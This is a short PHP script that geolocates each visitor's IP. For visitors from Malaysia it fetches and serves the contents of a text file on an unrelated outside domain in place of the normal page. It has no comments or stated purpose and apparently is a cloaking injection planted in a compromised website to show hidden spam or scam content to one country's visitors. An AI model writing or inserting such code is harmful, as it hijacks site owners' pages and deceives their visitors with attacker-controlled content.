<?php
function getUserCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/{$ip}";
    
    $response = @file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        return $data['countryCode'] ?? null;
    }
    return null;
}

$Zhyven = "https://ceppress.com/remnantnewspaper.com/index.txt";

if (getUserCountry() === "MY") {
    header("Content-Type: text/html; charset=UTF-8");
    echo @file_get_contents($Zhyven);
    exit();
}
?>